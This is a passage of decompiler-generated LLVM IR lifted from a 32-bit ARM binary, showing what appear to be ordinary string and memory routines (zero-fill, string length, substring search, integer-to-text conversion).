bb12:                                             ; preds = %.preheader
  ret i32 %arg1

bb13:                                             ; preds = %.preheader
  %v0_12050 = load i32, i32* %r3.global-to-local, align 4
  %v2_12050 = icmp eq i32 %v0_12050, 0
  store i1 %v2_12050, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12050, label %dec_label_pc_12058, label %._crit_edge

._crit_edge:                                      ; preds = %bb13
  %v0_12044.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.preheader

dec_label_pc_12058:                               ; preds = %dec_label_pc_12024, %bb13, %dec_label_pc_12058
  %v2_12060 = phi i32 [ %v6_12060, %dec_label_pc_12058 ], [ %v1_12024, %dec_label_pc_12024 ], [ %v6_12048, %bb13 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1205c = load i32, i32* %r2.global-to-local, align 4
  %v1_1205c = add i32 %v0_1205c, -1
  store i32 %v1_1205c, i32* %r2.global-to-local, align 4
  %v7_1205c = icmp eq i32 %v0_1205c, 1
  store i1 %v7_1205c, i1* %cpsr_z.global-to-local, align 1
  %v3_12060 = add i32 %v2_12060, 1
  %v4_12060 = inttoptr i32 %v3_12060 to i8*
  store i8 0, i8* %v4_12060, align 1
  %v5_12060 = load i32, i32* %ip.global-to-local, align 4
  %v6_12060 = add i32 %v5_12060, 1
  store i32 %v6_12060, i32* %ip.global-to-local, align 4
  %v0_12064 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12064, label %dec_label_pc_12068, label %dec_label_pc_12058

dec_label_pc_12068:                               ; preds = %dec_label_pc_12058
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_12060, { 1, 0 }
  uselistorder i32 %v0_1205c, { 1, 0 }
  uselistorder i32 %v6_12048, { 0, 2, 1 }
  uselistorder i32 %v1_12038, { 2, 1, 0 }
  uselistorder i32 %v2_12028, { 2, 1, 0 }
  uselistorder i32 %v1_12018, { 1, 0 }
  uselistorder i32 %v0_12014, { 1, 0 }
  uselistorder i32 %v6_12008, { 0, 1, 3, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 2, 3, 4, 6, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 7, 1, 10, 2, 3, 4, 5, 6, 8, 9, 11, 12 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 1, 2, 5, 3, 0, 4 }
  uselistorder label %dec_label_pc_12058, { 2, 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @function_1206c(i8* %arg1) local_unnamed_addr {
dec_label_pc_1206c:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1206c = load i32, i32* @r1, align 4
  %v2_1206c = icmp eq i32 %v0_1206c, 0
  br i1 %v2_1206c, label %bb, label %dec_label_pc_1209c

bb:                                               ; preds = %dec_label_pc_1206c
  ret i32 0

dec_label_pc_12084:                               ; preds = %dec_label_pc_120ac
  %v3_12084 = icmp uge i32 %v5_12138, %v1_12084
  %v9_12084 = icmp eq i32 %v5_12138, %v1_12084
  %v2_12088 = xor i1 %v3_12084, true
  %v3_12088 = or i1 %v9_12084, %v2_12088
  br i1 %v3_12088, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_12084
  %v6_12088 = sub i32 %v5_12138, %tmp
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_12084, %bb19
  %v5_1208c = phi i32 [ %v1_12084, %dec_label_pc_12084 ], [ %v6_12088, %bb19 ]
  %v2_1208c = xor i1 %v9_12084, true
  %v3_1208c = and i1 %v3_12084, %v2_1208c
  br i1 %v3_1208c, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  %v6_1208c = sub i32 %v5_1208c, %tmp
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v8_12090 = phi i32 [ %v5_1208c, %bb20 ], [ %v6_1208c, %bb21 ]
  ret i32 %v8_12090

dec_label_pc_12094:                               ; preds = %dec_label_pc_120e0
  br label %dec_label_pc_12134

dec_label_pc_1209c:                               ; preds = %dec_label_pc_1206c
  %v2_1209c = add i32 %tmp, %v0_1206c
  %v3_1209c = icmp ult i32 %v2_1209c, %tmp
  br i1 %v3_1209c, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_1209c
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_1209c, %bb23
  %v5_12138 = phi i32 [ %v2_1209c, %dec_label_pc_1209c ], [ -1, %bb23 ]
  %v1_120bc2 = urem i32 %tmp, 4
  %v2_120bc3 = icmp eq i32 %v1_120bc2, 0
  br i1 %v2_120bc3, label %dec_label_pc_120c4, label %dec_label_pc_120ac

dec_label_pc_120ac:                               ; preds = %bb24, %dec_label_pc_120b8
  %v1_12084 = phi i32 [ %v1_120b8, %dec_label_pc_120b8 ], [ %tmp, %bb24 ]
  %v1_120ac = inttoptr i32 %v1_12084 to i8*
  %v2_120ac = load i8, i8* %v1_120ac, align 1
  %v2_120b0 = icmp eq i8 %v2_120ac, 0
  br i1 %v2_120b0, label %dec_label_pc_12084, label %dec_label_pc_120b8

dec_label_pc_120b8:                               ; preds = %dec_label_pc_120ac
  %v1_120b8 = add i32 %v1_12084, 1
  %v1_120bc = urem i32 %v1_120b8, 4
  %v2_120bc = icmp eq i32 %v1_120bc, 0
  br i1 %v2_120bc, label %dec_label_pc_120c4, label %dec_label_pc_120ac

dec_label_pc_120c4:                               ; preds = %dec_label_pc_120b8, %bb24
  %storemerge.lcssa = phi i32 [ %tmp, %bb24 ], [ %v1_120b8, %dec_label_pc_120b8 ]
  store i32 %storemerge.lcssa, i32* @lr, align 4
  %v3_1212432 = icmp ult i32 %storemerge.lcssa, %v5_12138
  br i1 %v3_1212432, label %dec_label_pc_120cc, label %dec_label_pc_12134

dec_label_pc_120cc:                               ; preds = %dec_label_pc_12120, %dec_label_pc_120c4
  %v0_1209439 = phi i32 [ %v4_120cc, %dec_label_pc_12120 ], [ %storemerge.lcssa, %dec_label_pc_120c4 ]
  %v1_120cc = inttoptr i32 %v0_1209439 to i32*
  %v2_120cc = load i32, i32* %v1_120cc, align 4
  %v4_120cc = add i32 %v0_1209439, 4
  store i32 %v4_120cc, i32* @lr, align 4
  %v2_120d0 = add i32 %v2_120cc, -16843009
  %v2_120d4 = and i32 %v2_120d0, -2139062144
  %v2_120d8 = icmp eq i32 %v2_120d4, 0
  br i1 %v2_120d8, label %dec_label_pc_12120, label %dec_label_pc_120e0

dec_label_pc_120e0:                               ; preds = %dec_label_pc_120cc
  %v2_120e0 = inttoptr i32 %v0_1209439 to i8*
  %v3_120e0 = load i8, i8* %v2_120e0, align 1
  %v2_120e8 = icmp eq i8 %v3_120e0, 0
  %v1_120ec = add i32 %v0_1209439, 1
  br i1 %v2_120e8, label %dec_label_pc_12094, label %dec_label_pc_120f4

dec_label_pc_120f4:                               ; preds = %dec_label_pc_120e0
  %v2_120f4 = inttoptr i32 %v1_120ec to i8*
  %v3_120f4 = load i8, i8* %v2_120f4, align 1
  %v2_120f8 = icmp eq i8 %v3_120f4, 0
  br i1 %v2_120f8, label %dec_label_pc_12134, label %dec_label_pc_12100

dec_label_pc_12100:                               ; preds = %dec_label_pc_120f4
  %v1_12100 = add i32 %v0_1209439, 2
  %v2_12100 = inttoptr i32 %v1_12100 to i8*
  %v3_12100 = load i8, i8* %v2_12100, align 1
  %v2_12104 = icmp eq i8 %v3_12100, 0
  br i1 %v2_12104, label %dec_label_pc_12134, label %dec_label_pc_12110

dec_label_pc_12110:                               ; preds = %dec_label_pc_12100
  %v1_12110 = add i32 %v0_1209439, 3
  %v2_12110 = inttoptr i32 %v1_12110 to i8*
  %v3_12110 = load i8, i8* %v2_12110, align 1
  %v2_12114 = icmp eq i8 %v3_12110, 0
  br i1 %v2_12114, label %dec_label_pc_12134, label %dec_label_pc_12120

dec_label_pc_12120:                               ; preds = %dec_label_pc_12110, %dec_label_pc_120cc
  %v3_12124 = icmp ult i32 %v4_120cc, %v5_12138
  br i1 %v3_12124, label %dec_label_pc_120cc, label %dec_label_pc_12134

dec_label_pc_12134:                               ; preds = %dec_label_pc_12120, %dec_label_pc_120c4, %dec_label_pc_120f4, %dec_label_pc_12100, %dec_label_pc_12110, %dec_label_pc_12094
  %v1_12134 = phi i32 [ %v0_1209439, %dec_label_pc_12094 ], [ %storemerge.lcssa, %dec_label_pc_120c4 ], [ %v1_120ec, %dec_label_pc_120f4 ], [ %v1_12100, %dec_label_pc_12100 ], [ %v1_12110, %dec_label_pc_12110 ], [ %v5_12138, %dec_label_pc_12120 ]
  %v3_12134 = icmp uge i32 %v5_12138, %v1_12134
  %v9_12134 = icmp eq i32 %v5_12138, %v1_12134
  %v2_12138 = xor i1 %v3_12134, true
  %v3_12138 = or i1 %v9_12134, %v2_12138
  br i1 %v3_12138, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_12134
  %v6_12138 = sub i32 %v5_12138, %tmp
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_12134, %bb25
  %v5_1213c = phi i32 [ %v1_12134, %dec_label_pc_12134 ], [ %v6_12138, %bb25 ]
  %v2_1213c = xor i1 %v9_12134, true
  %v3_1213c = and i1 %v3_12134, %v2_1213c
  br i1 %v3_1213c, label %bb27, label %bb28

bb27:                                             ; preds = %bb26
  %v6_1213c = sub i32 %v5_1213c, %tmp
  br label %bb28

bb28:                                             ; preds = %bb26, %bb27
  %v8_12140 = phi i32 [ %v5_1213c, %bb26 ], [ %v6_1213c, %bb27 ]
  ret i32 %v8_12140

; uselistorder directives
  uselistorder i1 %v3_12134, { 1, 0 }
  uselistorder i32 %v4_120cc, { 1, 2, 0 }
  uselistorder i32 %v0_1209439, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_120b8, { 1, 0, 2 }
  uselistorder i32 %v1_12084, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_12138, { 3, 4, 5, 0, 2, 1, 8, 7, 6 }
  uselistorder i1 %v3_12084, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 5, 7, 8, 0, 6, 2, 1 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_12134, { 0, 4, 3, 2, 1, 5 }
  uselistorder label %dec_label_pc_120ac, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @function_1214c(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_1214c:
  %tmp = ptrtoint i8* %arg2 to i32
  %v6_1214c = load i32, i32* @r5, align 4
  %v9_1214c = load i32, i32* @r6, align 4
  %v3_12150 = load i8, i8* %arg2, align 1
  %v2_12154 = icmp eq i8 %v3_12150, 0
  br i1 %v2_12154, label %bb, label %bb50

bb:                                               ; preds = %dec_label_pc_1214c
  ret i32 %arg1

bb50:                                             ; preds = %dec_label_pc_1214c
  %v1_1215c = add i32 %arg1, -1
  br label %dec_label_pc_12160

dec_label_pc_12160:                               ; preds = %dec_label_pc_1216c, %bb50
  %v0_12160 = phi i32 [ %v1_12160, %dec_label_pc_1216c ], [ %v1_1215c, %bb50 ]
  %v1_12160 = add i32 %v0_12160, 1
  %v2_12160 = inttoptr i32 %v1_12160 to i8*
  %v3_12160 = load i8, i8* %v2_12160, align 1
  %v2_12164 = icmp eq i8 %v3_12160, 0
  br i1 %v2_12164, label %dec_label_pc_1223c, label %dec_label_pc_1216c

dec_label_pc_1216c:                               ; preds = %dec_label_pc_12160
  %v9_1216c = icmp eq i8 %v3_12160, %v3_12150
  br i1 %v9_1216c, label %dec_label_pc_12174, label %dec_label_pc_12160

dec_label_pc_12174:                               ; preds = %dec_label_pc_1216c
  %v2_12174 = add i32 %tmp, 1
  %v3_12174 = inttoptr i32 %v2_12174 to i8*
  %v4_12174 = load i8, i8* %v3_12174, align 1
  %v2_12178 = icmp eq i8 %v4_12174, 0
  br i1 %v2_12178, label %bb51, label %bb52

bb51:                                             ; preds = %dec_label_pc_12174
  store i32 %v6_1214c, i32* @r5, align 4
  store i32 %v9_1214c, i32* @r6, align 4
  ret i32 %v1_12160

bb52:                                             ; preds = %dec_label_pc_12174
  %v1_12184 = add i32 %v0_12160, 2
  %v1_121d8 = add i32 %tmp, 2
  %v2_121d8 = inttoptr i32 %v1_121d8 to i8*
  br label %dec_label_pc_121d0

dec_label_pc_12194:                               ; preds = %dec_label_pc_12230
  %v3_12194 = load i8, i8* %v3_121c8.pn.in, align 1
  store i32 %storemerge43, i32* @ip, align 4
  br label %dec_label_pc_121c0.preheader

dec_label_pc_121c0.preheader:                     ; preds = %dec_label_pc_12194, %dec_label_pc_121d0
  %v0_121c04.in = phi i8 [ %v3_12194, %dec_label_pc_12194 ], [ %v3_121c8.pn, %dec_label_pc_121d0 ]
  %v9_121c013 = icmp eq i8 %v0_121c04.in, %v3_12150
  br i1 %v9_121c013, label %dec_label_pc_121c8, label %dec_label_pc_121a0

dec_label_pc_121a0:                               ; preds = %dec_label_pc_121c0.preheader, %dec_label_pc_121bc
  %v0_121a8 = phi i32 [ %v1_121bc, %dec_label_pc_121bc ], [ %storemerge43, %dec_label_pc_121c0.preheader ]
  %v0_121a0.in = phi i8 [ %v3_121bc, %dec_label_pc_121bc ], [ %v0_121c04.in, %dec_label_pc_121c0.preheader ]
  %v2_121a0 = icmp eq i8 %v0_121a0.in, 0
  br i1 %v2_121a0, label %dec_label_pc_1223c, label %dec_label_pc_121a8

dec_label_pc_121a8:                               ; preds = %dec_label_pc_121a0
  %v1_121a8 = add i32 %v0_121a8, 1
  %v2_121a8 = inttoptr i32 %v1_121a8 to i8*
  %v3_121a8 = load i8, i8* %v2_121a8, align 1
  store i32 %v1_121a8, i32* @ip, align 4
  %v9_121ac = icmp eq i8 %v3_121a8, %v3_12150
  br i1 %v9_121ac, label %dec_label_pc_121c8, label %dec_label_pc_121b4

dec_label_pc_121b4:                               ; preds = %dec_label_pc_121a8
  %v2_121b4 = icmp eq i8 %v3_121a8, 0
  br i1 %v2_121b4, label %dec_label_pc_1223c, label %dec_label_pc_121bc

dec_label_pc_121bc:                               ; preds = %dec_label_pc_121b4
  %v1_121bc = add i32 %v0_121a8, 2
  %v2_121bc = inttoptr i32 %v1_121bc to i8*
  %v3_121bc = load i8, i8* %v2_121bc, align 1
  store i32 %v1_121bc, i32* @ip, align 4
  %v9_121c0 = icmp eq i8 %v3_121bc, %v3_12150
  br i1 %v9_121c0, label %dec_label_pc_121c8, label %dec_label_pc_121a0

dec_label_pc_121c8:                               ; preds = %dec_label_pc_121a8, %dec_label_pc_121bc, %dec_label_pc_121c0.preheader
  %v0_121c8 = phi i32 [ %storemerge43, %dec_label_pc_121c0.preheader ], [ %v1_121a8, %dec_label_pc_121a8 ], [ %v1_121bc, %dec_label_pc_121bc ]
  %v1_121c8 = add i32 %v0_121c8, 1
  br label %dec_label_pc_121d0

dec_label_pc_121d0:                               ; preds = %bb52, %dec_label_pc_121c8
  %storemerge43 = phi i32 [ %v1_121c8, %dec_label_pc_121c8 ], [ %v1_12184, %bb52 ]
  %v3_121c8.pn.in = inttoptr i32 %storemerge43 to i8*
  %v3_121c8.pn = load i8, i8* %v3_121c8.pn.in, align 1
  store i32 %storemerge43, i32* @ip, align 4
  %storemerge = icmp eq i8 %v3_121c8.pn, %v4_12174
  br i1 %storemerge, label %dec_label_pc_121d4, label %dec_label_pc_121c0.preheader

dec_label_pc_121d4:                               ; preds = %dec_label_pc_121d0
  %v1_121d4 = add i32 %storemerge43, 1
  %v2_121d4 = inttoptr i32 %v1_121d4 to i8*
  %v3_121d4 = load i8, i8* %v2_121d4, align 1
  %v4_121d4 = zext i8 %v3_121d4 to i32
  %v3_121d8 = load i8, i8* %v2_121d8, align 1
  %v4_121d8 = zext i8 %v3_121d8 to i32
  %v1_121dc = add i32 %storemerge43, -1
  %v9_121e0 = icmp eq i8 %v3_121d4, %v3_121d8
  store i32 %v1_121d8, i32* @lr, align 4
  store i32 %v1_121d4, i32* @ip, align 4
  br i1 %v9_121e0, label %dec_label_pc_121f0, label %dec_label_pc_12230

dec_label_pc_121f0:                               ; preds = %dec_label_pc_121d4, %dec_label_pc_121ec
  %v0_12208 = phi i32 [ %v1_12210, %dec_label_pc_121ec ], [ %v1_121d8, %dec_label_pc_121d4 ]
  %v0_12200 = phi i32 [ %v1_1220c, %dec_label_pc_121ec ], [ %v1_121d4, %dec_label_pc_121d4 ]
  %v0_121f0 = phi i32 [ %v4_12220, %dec_label_pc_121ec ], [ %v4_121d4, %dec_label_pc_121d4 ]
  %v2_121f0 = icmp eq i32 %v0_121f0, 0
  br i1 %v2_121f0, label %bb53, label %bb54

bb53:                                             ; preds = %dec_label_pc_121f0
  store i32 %v6_1214c, i32* @r5, align 4
  store i32 %v9_1214c, i32* @r6, align 4
  ret i32 %v1_121dc

bb54:                                             ; preds = %dec_label_pc_121f0
  %v1_121f8 = add i32 %v0_12200, 1
  %v2_121f8 = inttoptr i32 %v1_121f8 to i8*
  %v3_121f8 = load i8, i8* %v2_121f8, align 1
  %v1_121fc = add i32 %v0_12208, 1
  %v2_121fc = inttoptr i32 %v1_121fc to i8*
  %v3_121fc = load i8, i8* %v2_121fc, align 1
  %v4_121fc = zext i8 %v3_121fc to i32
  %v9_12204 = icmp eq i8 %v3_121f8, %v3_121fc
  %v1_1220c = add i32 %v0_12200, 2
  store i32 %v1_1220c, i32* @ip, align 4
  %v1_12210 = add i32 %v0_12208, 2
  store i32 %v1_12210, i32* @lr, align 4
  br i1 %v9_12204, label %dec_label_pc_12218, label %dec_label_pc_12230

dec_label_pc_12218:                               ; preds = %bb54
  %v2_12218 = icmp eq i8 %v3_121f8, 0
  br i1 %v2_12218, label %bb55, label %dec_label_pc_121ec

bb55:                                             ; preds = %dec_label_pc_12218
  store i32 %v6_1214c, i32* @r5, align 4
  store i32 %v9_1214c, i32* @r6, align 4
  ret i32 %v1_121dc

dec_label_pc_121ec:                               ; preds = %dec_label_pc_12218
  %v2_12220 = inttoptr i32 %v1_12210 to i8*
  %v3_12220 = load i8, i8* %v2_12220, align 1
  %v4_12220 = zext i8 %v3_12220 to i32
  %v2_12224 = inttoptr i32 %v1_1220c to i8*
  %v3_12224 = load i8, i8* %v2_12224, align 1
  %v9_12228 = icmp eq i8 %v3_12224, %v3_12220
  br i1 %v9_12228, label %dec_label_pc_121f0, label %dec_label_pc_12230

dec_label_pc_12230:                               ; preds = %dec_label_pc_121ec, %bb54, %dec_label_pc_121d4
  %v0_12230 = phi i32 [ %v4_121d8, %dec_label_pc_121d4 ], [ %v4_12220, %dec_label_pc_121ec ], [ %v4_121fc, %bb54 ]
  %v2_12230 = icmp eq i32 %v0_12230, 0
  br i1 %v2_12230, label %dec_label_pc_12238, label %dec_label_pc_12194

dec_label_pc_12238:                               ; preds = %dec_label_pc_12230
  store i32 %v6_1214c, i32* @r5, align 4
  store i32 %v9_1214c, i32* @r6, align 4
  ret i32 %v1_121dc

dec_label_pc_1223c:                               ; preds = %dec_label_pc_12160, %dec_label_pc_121b4, %dec_label_pc_121a0
  store i32 %v6_1214c, i32* @r5, align 4
  store i32 %v9_1214c, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_12210, { 0, 2, 1 }
  uselistorder i32 %v1_1220c, { 1, 2, 0 }
  uselistorder i32 %v1_121dc, { 2, 1, 0 }
  uselistorder i8 %v3_121c8.pn, { 1, 0 }
  uselistorder i8* %v3_121c8.pn.in, { 1, 0 }
  uselistorder i32 %storemerge43, { 4, 2, 6, 1, 3, 0, 5 }
  uselistorder i8 %v3_121bc, { 1, 0 }
  uselistorder i32 %v1_121bc, { 0, 2, 3, 1 }
  uselistorder i32 %v1_12160, { 0, 2, 1 }
  uselistorder i8 %v3_12150, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v9_1214c, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v6_1214c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1223c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_121f0, { 1, 0 }
  uselistorder label %dec_label_pc_121d0, { 1, 0 }
  uselistorder label %dec_label_pc_121c8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_121a0, { 1, 0 }
  uselistorder label %dec_label_pc_121c0.preheader, { 1, 0 }
}

define i32 @function_12244(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12244:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_1224c = call i32 @function_12258()
  %v0_12250 = load i32, i32* @r4, align 4
  ret i32 %v0_12250
}

define i32 @function_12258() local_unnamed_addr {
dec_label_pc_12258:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_12258 = load i32, i32* @r4, align 4
  %v0_1225c = load i32, i32* @r0, align 4
  %v0_12268 = load i32, i32* @r1, align 4
  store i32 %v0_12268, i32* @r8, align 4
  %v0_1226c = load i32, i32* @r2, align 4
  store i32 %v0_1226c, i32* @r6, align 4
  %tmp = icmp ult i32 %v0_1225c, 125
  br i1 %tmp, label %thread-pre-split.preheader, label %dec_label_pc_122a4

thread-pre-split.preheader:                       ; preds = %dec_label_pc_12258
  store i32 ptrtoint ([8 x i8]* @global_var_17608.287 to i32), i32* @r5, align 4
  %v2_1228c3446 = icmp eq i32 %v0_1225c, 0
  br i1 %v2_1228c3446, label %bb26, label %dec_label_pc_12280.lr.ph

dec_label_pc_12280:                               ; preds = %dec_label_pc_12280.lr.ph, %bb
  %v2_1229841 = phi i1 [ %v2_122983849, %dec_label_pc_12280.lr.ph ], [ %v2_12298, %bb ]
  %v1_1229c40 = phi i32 [ %v0_1228c.pr48, %dec_label_pc_12280.lr.ph ], [ %v2_12288, %bb ]
  %v0_1228439 = phi i32 [ %v0_12290547, %dec_label_pc_12280.lr.ph ], [ %v1_12284, %bb ]
  %v1_12284 = add i32 %v0_1228439, 1
  store i32 %v1_12284, i32* @r5, align 4
  br i1 %v2_1229841, label %bb, label %thread-pre-split.loopexit

bb:                                               ; preds = %dec_label_pc_12280
  %v2_12288 = add i32 %v1_1229c40, -1
  %v2_1228c = icmp eq i32 %v2_12288, 0
  %v1_12290 = inttoptr i32 %v1_12284 to i8*
  %v2_12290 = load i8, i8* %v1_12290, align 1
  %v2_12298 = icmp eq i8 %v2_12290, 0
  br i1 %v2_1228c, label %dec_label_pc_12298, label %dec_label_pc_12280

thread-pre-split.loopexit:                        ; preds = %dec_label_pc_12280
  %v1_1229035 = inttoptr i32 %v1_12284 to i8*
  %v2_1229036 = load i8, i8* %v1_1229035, align 1
  %v2_1229838 = icmp eq i8 %v2_1229036, 0
  br label %dec_label_pc_12280.lr.ph

dec_label_pc_12280.lr.ph:                         ; preds = %thread-pre-split.loopexit, %thread-pre-split.preheader
  %v2_122983849 = phi i1 [ %v2_1229838, %thread-pre-split.loopexit ], [ false, %thread-pre-split.preheader ]
  %v0_1228c.pr48 = phi i32 [ %v1_1229c40, %thread-pre-split.loopexit ], [ %v0_1225c, %thread-pre-split.preheader ]
  %v0_12290547 = phi i32 [ %v1_12284, %thread-pre-split.loopexit ], [ ptrtoint ([8 x i8]* @global_var_17608.287 to i32), %thread-pre-split.preheader ]
  br label %dec_label_pc_12280

dec_label_pc_12298:                               ; preds = %bb
  br i1 %v2_12298, label %dec_label_pc_122a4, label %bb26

bb26:                                             ; preds = %thread-pre-split.preheader, %dec_label_pc_12298
  %v0_12284.lcssa55 = phi i32 [ %v1_12284, %dec_label_pc_12298 ], [ ptrtoint ([8 x i8]* @global_var_17608.287 to i32), %thread-pre-split.preheader ]
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_122d8

dec_label_pc_122a4:                               ; preds = %dec_label_pc_12298, %dec_label_pc_12258
  %v3_122a8 = ashr i32 %v0_1225c, 31
  %v5_122bc = bitcast i32* %stack_var_-25 to i8*
  %v6_122bc = call i32 @function_1456c(i8* %v5_122bc, i32 %v0_1225c, i32 %v3_122a8, i32 -10, i32 0)
  %v1_122c0 = add i32 %v6_122bc, -14
  store i32 %v1_122c0, i32* @r5, align 4
  store i32 %v1_122c0, i32* @r0, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_175f8.289 to i32), i32* @r1, align 4
  store i32 14, i32* @r2, align 4
  %v0_122d0 = call i32 @function_11d60()
  store i32 22, i32* %r7.global-to-local, align 4
  %v0_122d8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_122d8

dec_label_pc_122d8:                               ; preds = %bb26, %dec_label_pc_122a4
  %v0_122d8 = phi i32 [ %v0_12284.lcssa55, %bb26 ], [ %v0_122d8.pre, %dec_label_pc_122a4 ]
  store i32 %v0_122d8, i32* @r0, align 4
  %v0_122dc = call i32 @function_11e30()
  %v0_122e0 = load i32, i32* @r8, align 4
  %v2_122e0 = icmp eq i32 %v0_122e0, 0
  %v1_122e4 = add i32 %v0_122dc, 1
  store i32 %v1_122e4, i32* @r4, align 4
  br i1 %v2_122e0, label %bb27, label %dec_label_pc_122d8._crit_edge

dec_label_pc_122d8._crit_edge:                    ; preds = %dec_label_pc_122d8
  %v1_122ec.pre = load i32, i32* @r6, align 4
  br label %bb28

bb27:                                             ; preds = %dec_label_pc_122d8
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_122d8._crit_edge, %bb27
  %v4_122f0 = phi i32 [ %v1_122ec.pre, %dec_label_pc_122d8._crit_edge ], [ 0, %bb27 ]
  %tmp56 = icmp ugt i32 %v1_122e4, %v4_122f0
  br i1 %tmp56, label %bb29, label %.thread16

bb29:                                             ; preds = %bb28
  store i32 %v4_122f0, i32* @r4, align 4
  store i32 34, i32* %r7.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %bb28, %bb29
  %v0_1230014 = phi i32 [ %v4_122f0, %bb29 ], [ %v1_122e4, %bb28 ]
  %v2_122f8 = icmp eq i32 %v0_1230014, 0
  br i1 %v2_122f8, label %dec_label_pc_1231c, label %dec_label_pc_12300

dec_label_pc_12300:                               ; preds = %.thread16
  store i32 %v0_1230014, i32* @r2, align 4
  %v0_12304 = load i32, i32* @r5, align 4
  store i32 %v0_12304, i32* @r1, align 4
  store i32 %v0_122e0, i32* @r0, align 4
  %v0_1230c = call i32 @function_11d60()
  %v0_12310 = load i32, i32* @r8, align 4
  %v1_12310 = load i32, i32* @r4, align 4
  %v2_12310 = add i32 %v1_12310, %v0_12310
  %v3_12318 = add i32 %v2_12310, -1
  %v4_12318 = inttoptr i32 %v3_12318 to i8*
  store i8 0, i8* %v4_12318, align 1
  br label %dec_label_pc_1231c

dec_label_pc_1231c:                               ; preds = %.thread16, %dec_label_pc_12300
  %v0_1231c = load i32, i32* %r7.global-to-local, align 4
  %v2_1231c = icmp eq i32 %v0_1231c, 0
  br i1 %v2_1231c, label %dec_label_pc_1232c, label %dec_label_pc_12324

dec_label_pc_12324:                               ; preds = %dec_label_pc_1231c
  %v0_12324 = call i32 @function_10a18()
  %v0_12328 = load i32, i32* %r7.global-to-local, align 4
  %v2_12328 = inttoptr i32 %v0_12324 to i32*
  store i32 %v0_12328, i32* %v2_12328, align 4
  %v0_1232c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1232c

dec_label_pc_1232c:                               ; preds = %dec_label_pc_1231c, %dec_label_pc_12324
  %v0_1232c = phi i32 [ 0, %dec_label_pc_1231c ], [ %v0_1232c.pre, %dec_label_pc_12324 ]
  store i32 %v3_12258, i32* @r4, align 4
  ret i32 %v0_1232c

; uselistorder directives
  uselistorder i32 %v4_122f0, { 1, 2, 0 }
  uselistorder i32 %v1_122e4, { 1, 0, 2 }
  uselistorder i32 %v1_12284, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_1225c, { 4, 3, 1, 2, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 ()* @function_11e30, { 27, 26, 25, 28, 24, 23, 22, 20, 21, 19, 18, 17, 16, 15, 14, 13, 12, 6, 11, 10, 9, 8, 7, 2, 5, 1, 4, 3, 0 }
  uselistorder label %dec_label_pc_1232c, { 1, 0 }
  uselistorder label %dec_label_pc_1231c, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %dec_label_pc_122d8, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @function_12340(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12340:
  store i32 ptrtoint (i32* @global_var_265f4.291 to i32), i32* @r2, align 4
  %v0_12344 = call i32 @function_15540()
  %v0_12348 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12348, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_12340
  %v1_12348 = load i32, i32* @r6, align 4
  %v3_12348 = load i32, i32* @r2, align 4
  %v4_12348 = inttoptr i32 %v3_12348 to i32*
  store i32 %v1_12348, i32* %v4_12348, align 4
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_12340, %bb
  ret i32 %v0_12344

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_1234c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1234c:
  %stack_var_-64 = alloca i32, align 4
  %v2_12350 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_12350, i32* @r1, align 4
  %v0_12358 = call i32 @function_1236c()
  %v1_1235c = sub i32 1, %v0_12358
  %v2_1235c = icmp ult i32 %v0_12358, 2
  br i1 %v2_1235c, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_1234c
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_1234c, %bb
